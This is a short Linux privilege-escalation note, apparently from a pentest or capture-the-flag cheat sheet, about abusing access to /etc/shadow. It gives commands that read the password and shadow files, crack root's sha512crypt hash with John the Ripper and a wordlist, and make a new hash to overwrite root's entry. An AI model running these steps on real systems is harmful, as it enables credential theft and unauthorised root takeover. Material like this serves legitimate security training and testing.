The /etc/shadow file stores password hashes for user accounts and is intended to be accessible only to the root user. Each line within the file corresponds to a user account, and the user's password hash is located between the first and second colons : on each line. The password hashing algorithm employed to generate the root user's hash is sha512crypt.

## Cracking the root hash
```sh
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hashes.txt
```

## Replace root's hash
Generate a cryptographic hash for a password of your selection and substitute the existing hash for the root user with the newly generated hash.
```sh
mkpasswd -m sha-512 <password of your choice>
```
